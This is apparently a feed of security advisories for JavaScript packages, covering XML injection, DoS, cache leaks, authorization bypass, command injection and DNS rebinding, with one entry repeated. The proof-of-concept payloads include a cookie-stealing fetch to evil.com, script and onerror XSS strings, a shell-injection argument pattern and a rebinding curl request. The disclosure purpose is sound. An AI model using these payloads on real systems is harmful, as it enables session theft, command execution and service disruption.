entry.title: [fast-xml-parser] fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters
entry.content:
fast-xml-parser XMLBuilder: Comment and CDATA Injection via Unescaped Delimiters

Summary

fast-xml-parser v5.5.12 (latest) XMLBuilder does not escape the --> sequence in comment content or the ]]> sequence in CDATA sections when building XML from JavaScript objects. This allows XML injection when user-controlled data flows into comments or CDATA elements, leading to XSS, SOAP injection, or data manipulation.

Existing CVEs for fast-xml-parser cover different issues:

  • CVE-2023-26920: Prototype pollution (parser)
  • CVE-2023-34104: ReDoS (parser)
  • CVE-2026-27942: Stack overflow in XMLBuilder with preserveOrder
  • CVE-2026-25896: Entity encoding bypass via regex in DOCTYPE entities

This finding covers unescaped comment/CDATA delimiters in XMLBuilder - a distinct vulnerability.

Vulnerable Code

File: src/fxb.js

// Line 442 - Comment building with NO escaping of -->
buildTextValNode(val, key, attrStr, level) {
    // ...
    if (key === this.options.commentPropName) {
        return this.indentate(level) + `<!--${val}-->` + this.newLine;  // VULNERABLE
    }
    // ...
    if (key === this.options.cdataPropName) {
        return this.indentate(level) + `<![CDATA[${val}]]>` + this.newLine;  // VULNERABLE
    }
}

Compare with attribute/text escaping which IS properly handled via replaceEntitiesValue().

Proof of Concept

Test 1: Comment Injection (XSS in SVG/HTML context)

import { XMLBuilder } from 'fast-xml-parser';

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true,
  suppressEmptyNode: true
});

const xml = {
  root: {
    "#comment": "--><script>alert('XSS')</script><!--",
    data: "legitimate content"
  }
};

console.log(builder.build(xml));

Output:

<root>
  <!----><script>alert('XSS')</script><!---->
  <data>legitimate content</data>
</root>

Test 2: CDATA Injection (RSS feed)

const builder = new XMLBuilder({
  cdataPropName: "#cdata",
  format: true,
  suppressEmptyNode: true
});

const rss = {
  rss: { channel: { item: {
    title: "Article",
    description: {
      "#cdata": "Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more"
    }
  }}}
};

console.log(builder.build(rss));

Output:

<rss>
  <channel>
    <item>
      <title>Article</title>
      <description>
        <![CDATA[Content]]><script>fetch('https://evil.com/'+document.cookie)</script><![CDATA[more]]>
      </description>
    </item>
  </channel>
</rss>

Test 3: SOAP Message Injection

const builder = new XMLBuilder({
  commentPropName: "#comment",
  format: true
});

const soap = {
  "soap:Envelope": {
    "soap:Body": {
      "#comment": "Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!--",
      Action: "getBalance",
      UserId: "12345"
    }
  }
};

console.log(builder.build(soap));

Output:

<soap:Envelope>
  <soap:Body>
    <!--Request from user: --><soap:Body><Action>deleteAll</Action></soap:Body><!---->
    <Action>getBalance</Action>
    <UserId>12345</UserId>
  </soap:Body>
</soap:Envelope>

The injected <Action>deleteAll</Action> appears as a real SOAP action element.

Tested Output

All tests run on Node.js v22, fast-xml-parser v5.5.12:

1. COMMENT INJECTION:
   Injection successful: true

2. CDATA INJECTION (RSS feed scenario):
   Injection successful: true

4. Round-trip test:
   Injection present: true

5. SOAP MESSAGE INJECTION:
   Contains injected Action: true

Impact

An attacker who controls data that flows into XML comments or CDATA sections via XMLBuilder can:

  1. XSS: Inject <script> tags into XML/SVG/HTML documents served to browsers
  2. SOAP injection: Modify SOAP message structure by injecting XML elements
  3. RSS/Atom feed poisoning: Inject scripts into RSS feed items via CDATA breakout
  4. XML document manipulation: Break XML structure by escaping comment/CDATA context

This is practically exploitable whenever applications use XMLBuilder to generate XML from data that includes user-controlled content in comments or CDATA (e.g., RSS feeds, SOAP services, SVG generation, config files).

Suggested Fix

Escape delimiters in comment and CDATA content:

// For comments: replace -- with escaped equivalent
if (key === this.options.commentPropName) {
    const safeVal = String(val).replace(/--/g, '--');
    return this.indentate(level) + `<!--${safeVal}-->` + this.newLine;
}

// For CDATA: split on ]]> and rejoin with separate CDATA sections
if (key === this.options.cdataPropName) {
    const safeVal = String(val).replace(/]]>/g, ']]]]><![CDATA[>');
    return this.indentate(level) + `<![CDATA[${safeVal}]]>` + this.newLine;
}

References

  • https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-gh4j-gqv2-49f6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-41650
  • https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.6.0
  • https://github.com/NaturalIntelligence/fast-xml-parser/commit/e561c2188607a108a9a8d9b6428902a28aad8fb0
  • https://github.com/advisories/GHSA-gh4j-gqv2-49f6

entry.title: [@libp2p/gossipsub] libp2p: gossipsub creates a permanent topics-map entry per distinct subscription with no cap in the default config
entry.content:
Summary

A single gossipsub peer can grow a node's topics map without bound by flooding subscription RPCs, because the default configuration has no global, per-peer, or topic-length cap and peer scoring does not penalise subscription volume. The peer is never greylisted, so the growth continues toward OOM.

Details

handleReceivedSubscription (packages/gossipsub/src/gossipsub.ts:1028, line 1036) runs this.topics.set(topic, new Set()) for every distinct topic string:

private handleReceivedSubscription (from, topic, subscribe) {
  let topicSet = this.topics.get(topic)
  if (subscribe) {
    if (topicSet == null) {
      topicSet = new Set()
      this.topics.set(topic, topicSet)   // no global cap, no per-peer cap
    }
    topicSet.add(from.toString())
  }
}

The only topical gate (gossipsub.ts:981, if (this.allowedTopics != null && !this.allowedTopics.has(topic)) return) is skipped when allowedTopics is null — the default. Subscriptions are unsigned RPC metadata (no signature needed); decodeRpc's per-RPC limit caps count (maxSubscriptions = 5000) but not topic-string length or aggregate size; and the peer-scoring components P1–P7 have no subscription-volume term, so the attacker's score stays at 0 (above the graylistThreshold of −80) and acceptFrom keeps returning true. Verified on js-libp2p commit a04f5e0, where @libp2p/gossipsub reads 16.0.4.

PoC

Full PoC attached (gossipsub-topics-unbounded-growth-poc.tar.gz). Build the js-libp2p monorepo at the affected version (npm install --ignore-scripts && npm run build), extract the package inside the monorepo root (sibling of packages/), then cd gossipsub-topics-unbounded-growth-poc && node attack.mjs. Expected (default config):

[*] sending 300 RPC frames x 4000 unique ~190-byte topic subscriptions (1,200,000 topics total)
[*]   progress: 88% sent | victim topics=1,032,000 rss=740MB peers=1
[*] victim quiesced: topics=~1,100,000 rss=~870MB peers=1
[!] Vulnerability reproduced: one connected peer grew the victim's gossipsub topics map to ~1.1M entries (RSS +~900MB) with 300 subscription RPCs — no global, per-peer, or topic-length cap in the default config

Control run (ALLOWED_TOPICS=legit-topic, i.e. node attack.mjs control): the identical flood is rejected at the allowedTopics gate and the topics map stays at 0 entries — confirming the vulnerable condition is the default allowedTopics-unset config. The map grows monotonically with no cap until the victim's own resource pressure trips; on disconnect removePeer performs an O(N) sweep over every topic entry (a secondary CPU cost) while the ~1 GB heap stays committed.

Impact

CWE-400/CWE-770. Every node running default gossipsub is affected; the attacker needs only one connection and is never rate-limited or greylisted. Growth continues toward OOM; on disconnect the O(N) removePeer sweep adds CPU cost. Suggested fix: bound by default (not opt-in) — a global cap on topics.size, a per-peer subscription cap with a P7 behaviour penalty so acceptFrom eventually greylists, a topic-string length cap at decode time, and/or flipping allowedTopics to deny-by-default; make removePeer's topic iteration non-blocking/capped.

gossipsub-topics-unbounded-growth-poc.tar.gz

References

  • https://github.com/libp2p/js-libp2p/security/advisories/GHSA-x2vm-cf3p-m2w8
  • https://github.com/libp2p/js-libp2p/pull/3593
  • https://github.com/libp2p/js-libp2p/commit/d5534174d8b7d23ac1bd45a7e738664fbfb0cf4c
  • https://github.com/libp2p/js-libp2p/releases/tag/gossipsub-v17.0.0
  • https://github.com/advisories/GHSA-x2vm-cf3p-m2w8

entry.title: [@libp2p/crypto] libp2p: ASN.1 DER decoder drives an unbounded synchronous loop on attacker-controlled length fields, stalling the Node event loop pre-auth
entry.content:
Summary

A remote peer can stall a js-libp2p node's entire event loop for ~4–5 seconds per connection (and transiently allocate ~2 GB) by sending a ~15-byte crafted publicKey inside an Identify message. The malformed key reaches the DER decoder before any peer-id/signature check, so the attack is pre-auth and repeatable indefinitely by reconnecting.

Details

packages/crypto/src/keys/rsa/der.ts readLength() parses DER long-form lengths with no comparison to buf.byteLength, and readInteger() then loops over the attacker-claimed length:

function readInteger (buf, context) {
  const length = readLength(buf, context)   // attacker-controlled, claims up to 2^64
  const end = context.offset + length
  for (let i = context.offset; i < end; i++) // runs far past buf.byteLength
    vals.push(buf[i])                         // pushes `undefined` past the end
}

The blob reaches the parser pre-auth: Identify runs on every connection:open and calls publicKeyFromProtobuf(publicKey) (packages/protocol-identify/src/identify.ts:85) before the connection.remotePeer.equals(id) check at identify.ts:88. The MAX_RSA_JWK_SIZE guard in pkixToRSAPublicKey only bounds the total blob size, not the inner length field, so a 15-byte payload defeats it; the ECDSA path (unmarshalECDSAPublicKey) has no cap at all. The decode runs in a single synchronous tick, so no AbortSignal — including Identify's 5 s timeout — can interrupt it. Verified on js-libp2p commit a04f5e0, where @libp2p/crypto reads 5.1.21.

PoC

Full PoC attached (libp2p-crypto-der-eventloop-dos-poc.tar.gz). Build the js-libp2p monorepo at the affected version (npm install --ignore-scripts && npm run build), extract the package inside the monorepo root (sibling of packages/), then cd libp2p-crypto-der-eventloop-dos-poc && node attack.mjs. Expected:

[*] round 1: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[*] round 2: payload sent=true, victim event-loop stall = 4-5s, peak RSS ~1980 MB
[*] round 3: payload sent=true, victim event-loop stall = 4s, peak RSS ~1980 MB
[!] Vulnerability reproduced: 3/3 connections each stalled the victim's event loop for ~4-5s — one crafted ~15-byte Identify publicKey per connection, pre-auth

The stall is measured from the victim's own 1 s heartbeat clock (frozen while the loop is blocked); the ~2 GB transient RSS peak is read from /proc/<pid>/status. The DER RangeError is swallowed by Identify's .catch(() => {}), so the node survives and every new connection re-stalls it; under a container memory limit the ~2 GB spike OOM-kills the process. A node attack.mjs control run (legitimate Identify) shows 0 s stalls.

Impact

CWE-130/CWE-400. Any node running the default Identify service is affected. A single peer can keep the node unresponsive to all of its peers (every new connection adds another multi-second stall — all timers, heartbeats, and protocol timeouts stop) and, in memory-constrained deployments, force an OOM kill. Suggested fix: in readLength, reject any long-form length whose value exceeds buf.byteLength - context.offset; in readInteger/readObjectIdentifier/readBitString/readOctetString, clamp or assert end/finalOffset against buf.byteLength before looping; add an overall DER-element-length sanity cap at decodeDer entry and a byte-length cap in unmarshalECDSAPublicKey.

libp2p-crypto-der-eventloop-dos-poc.tar.gz

References

  • https://github.com/libp2p/js-libp2p/security/advisories/GHSA-rvfr-cqwq-rc4j
  • https://github.com/libp2p/js-libp2p/pull/3587
  • https://github.com/libp2p/js-libp2p/commit/ef6e1851cb00511a4793a5e68948e0cdad385332
  • https://github.com/libp2p/js-libp2p/releases/tag/crypto-v5.1.22
  • https://github.com/advisories/GHSA-rvfr-cqwq-rc4j

entry.title: [next] Next.js: Cache leak across root param values in nested 'use cache' functions via delayed inner stream metadata
entry.content:
With Cache Components enabled, an outer 'use cache' function can be keyed incorrectly even when its inner 'use cache' call generates a fresh entry. If the inner function reads a root param (via next/root-params) and returns a value that still contains pending promises — for example an object with data that is ready immediately alongside slower data — React Flight delivers the ready portion to the outer function before the inner entry has finished publishing its root param dependencies. The outer function can then finish, and its cache entry is persisted under a key that omits that root param. The entry is written once and reused for all root param values, so a response for one root param value can serve content produced for a different value. Entries written this way can also ignore tag invalidation and cache lifetimes of the nested caches they consumed.

What values are leaked cannot be attacker controlled. Which value's content is served depends only on which invocation wrote the entry first.

This is a variant of https://github.com/advisories/GHSA-h694-7cp9-m8p3 that the fix for that advisory does not cover: it does not require the inner call to be served from an existing entry, and it does not depend on a slow cache handler.

References

  • https://github.com/vercel/next.js/security/advisories/GHSA-vc7v-qv4w-wrv8
  • https://nvd.nist.gov/vuln/detail/CVE-2026-119351
  • https://github.com/vercel/next.js/commit/80c96ede21798d4ad54da12fe50d5b00a09b06e3
  • https://github.com/vercel/next.js/releases/tag/v16.4.5
  • https://nextjs.org/blog/november-2026-security-release
  • https://github.com/advisories/GHSA-vc7v-qv4w-wrv8

entry.title: [picomatch] picomatch vulnerable to ReDoS through single-branch repeated extglobs
entry.content:
Picomatch through 4.0.7 contains a regular expression denial of service vulnerability that allows attackers to block the event loop by supplying single-branch repeated extglob patterns. Attackers can provide globs like +(*) or +(*a), which analyzeRepeatedExtglob in lib/parse.js skips, causing exponential backtracking against short crafted strings and denying service to Node.js applications.

References

  • https://nvd.nist.gov/vuln/detail/CVE-2026-112366
  • https://github.com/micromatch/picomatch/pull/194
  • https://github.com/micromatch/picomatch/blob/4.0.7/lib/parse.js#L287-L307
  • https://www.vulncheck.com/advisories/picomatch-through-4.0.7-redos-via-single-branch-repeated-extglob-patterns
  • https://github.com/advisories/GHSA-fc5q-39xc-vjpf

entry.title: [directus] Directus: Share update allows reassigning user_created and role
entry.content:
Summary

A non-admin user who can update their own shares can reassign a share's creator (user_created), role, item, and collection fields after the share is created. The update is authorized against the row as it existed before the change, and the resulting row is never revalidated, so these fields can be set to values the user would not be permitted to assign when creating a share. By reassigning both user_created and role to an administrator the share's effective permissions get elevated.

This is a server-side authorization gap in the share update path. It does not by itself produce an administrator token. It re-opens a previously patched privilege-escalation surface on the effective permissions of a share.

Prerequisites

  • An authenticated non-admin account that holds update permission on directus_shares. This is not part of the baseline app-access grant, which is read-only on a user's own shares, but it is part of the recommended defaults permission template for directus_shares that instances commonly apply so the share feature is usable.
  • An item the account is allowed to share.
  • Knowledge of an administrator user and role identifier to assign. In the reported case these were read from a relation on the shareable item using ordinary read permissions.

Details

The recommended default permission for updating directus_shares selects rows where the caller is the creator and permits writes to the full field set, including the creator, role, item, and collection. The ownership filter is evaluated only against the row as it exists before the update, so an owned share passes the check. The merged row is never re-checked to decide whether the caller may assign the new values.

Two guards that are enforced when a share is created are absent on update. On create, the creator is forced to the acting user, and a share-access check is run against the target item to confirm the caller is allowed to share it. On update, the supplied creator value is stored as given and no equivalent share-access check is run against the new item or collection, so both the creator and the shared target can be repointed to values the caller was never authorized to set. The read-only marking on the creator field in the schema is a Data Studio UI hint and does not constrain writes through the API.

When a guest authenticates through the share, Directus derives one accountability from the share's creator and another from the share's role, and applies administrator reach only when both resolve to an administrator. After both fields are reassigned to an administrator, both inputs resolve to administrator and the share is evaluated with full-schema reach starting from the shared item. This is the bypass of the CVE-2025-24353 intersection, which assumed the creator and selected role remain trustworthy after creation, when in fact both are mutable together through update.

Impact

Improper authorization (CWE-863) and improper privilege management (CWE-269). A non-admin can raise the effective permissions of a share they own beyond both their own permissions and the share role's permissions, exposing data reachable from the shared item that neither principal should be able to expose. The direct impact is to confidentiality. This issue alone does not grant write or availability impact.

References

  • https://github.com/directus/directus/security/advisories/GHSA-7h45-q5jx-7r87
  • https://nvd.nist.gov/vuln/detail/CVE-2026-129239
  • https://github.com/directus/directus/pull/28145
  • https://github.com/directus/directus/commit/5869c06f6997af0d2f13b39b3d19297dd2ed2f65
  • https://github.com/directus/directus/releases/tag/v12.3.1
  • https://github.com/advisories/GHSA-7h45-q5jx-7r87

entry.title: [code-review-mcp-server] code-review-mcp-server: Command injection via unsanitized folderPath/baseBranch parameters
entry.content:
Impact

code-review-mcp-server exposes MCP tools (getLocalGitDiff, codeReview, createPR, getPRTemplate) that accept folderPath and baseBranch string parameters. These caller-controlled values were interpolated directly into shell command strings executed via child_process.execSync(), which runs commands through /bin/sh.

A crafted value such as baseBranch = "main; <arbitrary command> #" (or a $(...) command substitution, or a folderPath that breaks out of the surrounding quotes) results in arbitrary command execution on the host running the MCP server.

Patches

Fixed in 1.5.3. Every execSync() call was replaced with execFileSync() using argument arrays, so inputs are passed directly to git / gh without going through a shell, eliminating the injection at its root.

Workarounds

None. Upgrade to code-review-mcp-server@1.5.3 or later.

References

  • https://github.com/Orcus2021/code-review-mcp-server/security/advisories/GHSA-jq3q-62jc-fqq9
  • https://github.com/Orcus2021/code-review-mcp-server/issues/56
  • https://github.com/Orcus2021/code-review-mcp-server/pull/57
  • https://github.com/Orcus2021/code-review-mcp-server/commit/d11642322b607556affaaa3fd631d4f8942c05d8
  • https://github.com/Orcus2021/code-review-mcp-server/releases/tag/v1.5.3
  • https://github.com/advisories/GHSA-jq3q-62jc-fqq9

entry.title: [next] Next.js: Information disclosure across root params when a 'use cache' function is called through unstable_cache()
entry.content:
Next.js applications with 'use cache' can disclose cached data across root params when the same 'use cache' function is called both directly during rendering and through unstable_cache(), and that function reads a root param. Root params are route parameters of the root layout, and applications commonly use them to scope data, for example per locale.

During a cold process start, a cross-request deduplication race allowed an unstable_cache() call to join the in-flight fill of a concurrent direct call and receive its result, bypassing the root param check that would normally reject it. unstable_cache() then stored that result under a cache key without root params, so subsequent requests for other root param values received the same entry until it is revalidated or evicted. Cached data produced for one root param value is returned to requests for other values.

Exploitation requires the unstable_cache() request to arrive while the function's first fill after a process start is still in flight. Outside this race, the nesting already throws an error: 'use cache' inside unstable_cache() is unsupported, and avoiding it is a complete workaround.

entry.title: [@nuxt/nitro-server] Nuxt: Colliding island props can share one `/__nuxt_island` path (incomplete fix for CVE-2026-46342)
entry.content:
Summary

The fix for CVE-2026-46342 (GHSA-g8wj-3cr3-6w7v) binds each /__nuxt_island/<Name>_<hash>.json path to its props by hashing the (name, props, context, source) tuple. That hash was computed over ohash's serialization, which does not escape quotes inside strings or delimiters inside keys, so two different prop objects can produce the same hash. A request with crafted props can therefore pass validation for another island's path and render different content at that path.

Impact

For example, these two prop objects serialize identically and share one island path:

{ html: '', note: '<img src=x onerror="alert(1)">' }
{ html: '\',note:\'<img src=x onerror="alert(1)">' }

This reopens the scenarios described in GHSA-g8wj-3cr3-6w7v:

  • nuxt generate / prerendering. Nuxt caches prerendered island responses by path. If the crawler reaches a link to the colliding URL (for example in user-submitted content included in the build) before it renders the page that uses the legitimate props, the colliding response is written into the generated page.
  • Path-keyed shared caches. A CDN or reverse proxy that caches /__nuxt_island/* by path only, ignoring the query, can be primed with the colliding response.

An attacker has to construct props that collide with a specific legitimate tuple, which in practice means at least part of that tuple is a string they control (for example a stored comment or profile field passed as a prop). Where a prop reaches an unsafe HTML sink in the island (v-html, innerHTML, a renderer treating a prop as HTML), the substituted response can execute script in the site's origin. Without such a sink, the impact is content substitution.

Applications are not affected if they do not use server components or <NuxtIsland>, or if no island receives attacker-influenced string props. Server-rendered responses that are not cached by path alone are also unaffected.

Patches

Fixed in nuxt@4.6.4 and @nuxt/nitro-server@4.6.4. The island hash is now computed over a canonical JSON encoding of the tuple, in which strings and keys are escaped, so different props can no longer produce the same hash.

Island hashes change as a result. Clients that build island URLs themselves should use the exported getIslandHash rather than hashing with ohash directly.

Nuxt 3 has reached end of life and will not receive a fix. Upgrade to Nuxt 4.

Workarounds

  • Ensure any intermediary cache keys /__nuxt_island/* on the full query string, not on the path alone.
  • Treat island props as untrusted input and do not pass them to v-html or other HTML sinks without sanitisation.
  • When prerendering, avoid including user-submitted links to /__nuxt_island/ in crawled pages, for example by excluding that prefix with nitro.prerender.ignore:
export default defineNuxtConfig({
  nitro: {
    prerender: {
      ignore: [route => route.startsWith('/__nuxt_island/') && route.includes('?')],
    },
  },
})

Thanks to rat5ak for reporting this issue.

entry.title: [nuxt] Nuxt exposes the message and data of unhandled errors thrown during server rendering
entry.content:
Summary

When a page, plugin or route middleware throws an error that is not an HTTP error, Nuxt wraps it with createError before rendering the error page. The wrapped error was treated as one the app raised deliberately, so in production its message and data were sent to the client in the error page payload (__NUXT_DATA__) and in JSON error responses. For a failed $fetch, that is the URL that was requested (including its query string) and the body of the upstream error response.

Impact

An application is affected if server-rendered code lets an error with sensitive details reach the error page, for example:

<script setup lang="ts">
const route = useRoute()
// the upstream error body, and the token in the URL, reach the client if this request fails
await $fetch(`http://users.internal/users/${route.params.id}?token=${useRuntimeConfig().usersToken}`)
</script>

Anyone who can make the request fail (for example by requesting an id the upstream service rejects) receives [GET] "http://users.internal/users/1?token=...": 502 and the upstream response body. This happens regardless of what a custom error.vue renders, because the details are part of the payload. With the default configuration, the HTTP status line is not affected.

The same applies to any other error thrown during server rendering, such as a database driver error whose message names an internal host.

Errors created deliberately with createError (or showError) are not affected: their message and data are meant for the client. Errors returned by useFetch and useAsyncData are also unchanged, as they are part of the payload by design. Server routes (server/api) are not affected.

Patches

Fixed in nuxt@4.6.4. Nuxt now marks any thrown value that is not already an HTTP error as unhandled, so the error page and JSON responses receive its status and a generic message. As a result, the error page no longer shows the message of an error thrown with throw new Error(...) in production; throw a createError with what the client may see instead.

Nuxt 3 has reached end of life and will not receive a fix. Upgrade to Nuxt 4, or apply the workaround below.

Workarounds

Catch errors from server-side requests and rethrow them with only the details the client may see:

try {
  await $fetch(url)
} catch (error) {
  throw createError({ statusCode: 502, statusMessage: 'Upstream request failed' })
}

Alternatively, add a Nitro plugin that hides the details of errors Nuxt wrapped. This also hides the details of a createError called with an Error (or with a cause):

// server/plugins/hide-error-details.ts
export default defineNitroPlugin((nitroApp) => {
  nitroApp.hooks.hook('error', (error) => {
    const cause = (error as { cause?: unknown }).cause
    if (cause instanceof Error && !(cause.constructor as { __h3_error__?: boolean }).__h3_error__) {
      Object.assign(error, { unhandled: true, data: undefined })
    }
  })
})

If secrets such as tokens in upstream URLs may have been exposed this way, rotate them.

Credits

Thanks to abhijit_dave for reporting this through the Vercel HackerOne program.

References

entry.title: [nuxt] Nuxt payload URL generation has quadratic cost for repeated slashes in the request path
entry.content:
Summary

Nuxt strips trailing slashes from the request path with a regular expression whose cost grows quadratically with the length of a run of consecutive slashes. A single unauthenticated request with a long run of slashes can occupy the server's event loop for a noticeable time, delaying every other request handled by the same process.

Impact

When a page is rendered with payload extraction (any route covered by an isr, swr or cache route rule), Nuxt builds the _payload.json URL from the raw request path. A path such as /blog/a followed by 16,000 slashes and x, which fits within Node's default header size limit, takes roughly 0.1 to 0.4 seconds of synchronous CPU time per request, depending on hardware. Concurrent requests to the same process wait for it to finish, so a modest request rate can keep a process saturated.

An app is affected if it uses Nuxt 4.6.0 or later with server-side rendering and has a route rule like:

export default defineNuxtConfig({
  routeRules: {
    '/blog/**': { swr: true },
  },
})

The same pattern is also reachable through the opt-in experimental.early404 option, for any request path.

Apps without isr, swr or cache route rules and without experimental.early404 are not affected, nor are fully prerendered or client-only apps. The cost is bounded by the maximum request path length, so a reverse proxy with a smaller header limit reduces it further. There is no confidentiality or integrity impact.

Patches

Fixed in nuxt 4.6.4. Trailing slashes are now removed with a linear scan instead of a regular expression.

Workarounds

Reject request paths containing repeated slashes before they reach the renderer, for example at the reverse proxy or with a server middleware:

// server/middleware/reject-repeated-slashes.ts
export default defineEventHandler((event) => {
  if (event.path.split('?')[0]!.includes('//')) {
    throw createError({ statusCode: 404 })
  }
})

If you use experimental.early404, you can also disable it until you upgrade.

Credits

Thanks to cryptofox9 for reporting this issue.

References

  • https://github.com/nuxt/nuxt/security/advisories/GHSA-r9jc-w898-3fv6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-128074
  • https://github.com/nuxt/nuxt/commit/97424dd21c59b60cc7ece28576e15069ca0fdbc4
  • https://github.com/nuxt/nuxt/releases/tag/v4.6.4
  • https://github.com/advisories/GHSA-r9jc-w898-3fv6

entry.title: [@nuxt/rspack-builder] @nuxt/webpack-builder and @nuxt/rspack-builder dev server serves built source to DNS rebinding pages
entry.content:
Summary

When using the webpack or rspack builder, the dev server serves built client chunks to any request whose Host header matches its Origin/Referer, or that carries Sec-Fetch-Site: same-origin. After a DNS rebinding attack both headers name the attacker's hostname, so a malicious page opened while nuxt dev is running can read /_nuxt/*.js and exfiltrate the app's source. This bypasses the same-origin check added for GHSA-4gf7-ff8x-hq99, GHSA-6m52-m754-pw2g and GHSA-x6qj-4h56-5rj5.

Impact

A developer runs nuxt dev with builder: 'webpack' or builder: 'rspack' (the default config is enough; --host is not required) and opens a page on an attacker-controlled hostname, for example http://rebind.attacker.example:3000/. The attacker then re-points that hostname at 127.0.0.1. Requests from the page now reach the dev server as same-origin requests:

curl -H 'Host: rebind.attacker.example:3000' -H 'Sec-Fetch-Site: same-origin' http://127.0.0.1:3000/_nuxt/app.js
# 200, with the compiled modules

The page can read the response with fetch, which exposes the compiled source and its inline source maps, module identifiers, the developer's local filesystem paths, and any developer-controlled values inlined into the client bundle (for example through a custom DefinePlugin). With rspack, the HMR websocket also accepts connections from the rebound hostname. Private runtimeConfig is not part of the client bundle.

The attacker needs to know or guess the dev server port and to time the DNS change. Chrome 142+ and other Chromium-based browsers that enforce Local Network Access restrictions prompt before a public page can reach a loopback address.

The default Vite builder is not affected: Vite rejects unknown Host headers through server.allowedHosts. Production builds are not affected.

Patches

Fixed in @nuxt/webpack-builder 4.6.4 and @nuxt/rspack-builder 4.6.4. The dev middleware now rejects requests whose Host header is not localhost, *.localhost, an IP address, or a hostname allowed by the new devServer.allowedHosts option or by vite.server.allowedHosts, before any Sec-Fetch-Site/Origin/Referer checks. This includes devServer.host and the hosts nuxt dev allows for the addresses it listens on; nuxt dev --public allows any host, as it does with Vite. With rspack, the same list is passed to rsbuild's server.allowedHosts, which covers the HMR websocket.

When accessing the dev server through another hostname, for example through a reverse proxy, add that hostname to devServer.allowedHosts (a leading . also allows subdomains; true allows any host).

Nuxt 3 has reached end of life and will not receive a fix.

Workarounds

  • Use the default Vite builder for development.
  • Use Chrome 142+ or another Chromium-based browser that enforces Local Network Access restrictions, and don't open untrusted sites in other browsers while the dev server is running.
  • Treat secrets inlined into the client bundle during development as exposed and rotate them.

Credits

Nuxt thanks Anthropic for reporting this through coordinated disclosure (ANT-2026-VKRM97G5).

References

entry.title: [@nuxt/rspack-builder] @nuxt/webpack-builder and @nuxt/rspack-builder dev server serves built source to DNS rebinding pages
entry.content:
Summary

When using the webpack or rspack builder, the dev server serves built client chunks to any request whose Host header matches its Origin/Referer, or that carries Sec-Fetch-Site: same-origin. After a DNS rebinding attack both headers name the attacker's hostname, so a malicious page opened while nuxt dev is running can read /_nuxt/*.js and exfiltrate the app's source. This bypasses the same-origin check added for GHSA-4gf7-ff8x-hq99, GHSA-6m52-m754-pw2g and GHSA-x6qj-4h56-5rj5.

Impact

A developer runs nuxt dev with builder: 'webpack' or builder: 'rspack' (the default config is enough; --host is not required) and opens a page on an attacker-controlled hostname, for example http://rebind.attacker.example:3000/. The attacker then re-points that hostname at 127.0.0.1. Requests from the page now reach the dev server as same-origin requests:

curl -H 'Host: rebind.attacker.example:3000' -H 'Sec-Fetch-Site: same-origin' http://127.0.0.1:3000/_nuxt/app.js
# 200, with the compiled modules

The page can read the response with fetch, which exposes the compiled source and its inline source maps, module identifiers, the developer's local filesystem paths, and any developer-controlled values inlined into the client bundle (for example through a custom DefinePlugin). With rspack, the HMR websocket also accepts connections from the rebound hostname. Private runtimeConfig is not part of the client bundle.

The attacker needs to know or guess the dev server port and to time the DNS change. Chrome 142+ and other Chromium-based browsers that enforce Local Network Access restrictions prompt before a public page can reach a loopback address.

The default Vite builder is not affected: Vite rejects unknown Host headers through server.allowedHosts. Production builds are not affected.

Patches

Fixed in @nuxt/webpack-builder 4.6.4 and @nuxt/rspack-builder 4.6.4. The dev middleware now rejects requests whose Host header is not localhost, *.localhost, an IP address, or a hostname allowed by the new devServer.allowedHosts option or by vite.server.allowedHosts, before any Sec-Fetch-Site/Origin/Referer checks. This includes devServer.host and the hosts nuxt dev allows for the addresses it listens on; nuxt dev --public allows any host, as it does with Vite. With rspack, the same list is passed to rsbuild's server.allowedHosts, which covers the HMR websocket.

When accessing the dev server through another hostname, for example through a reverse proxy, add that hostname to devServer.allowedHosts (a leading . also allows subdomains; true allows any host).

Nuxt 3 has reached end of life and will not receive a fix.

Workarounds

  • Use the default Vite builder for development.
  • Use Chrome 142+ or another Chromium-based browser that enforces Local Network Access restrictions, and don't open untrusted sites in other browsers while the dev server is running.
  • Treat secrets inlined into the client bundle during development as exposed and rotate them.

Credits

Nuxt thanks Anthropic for reporting this through coordinated disclosure (ANT-2026-VKRM97G5).
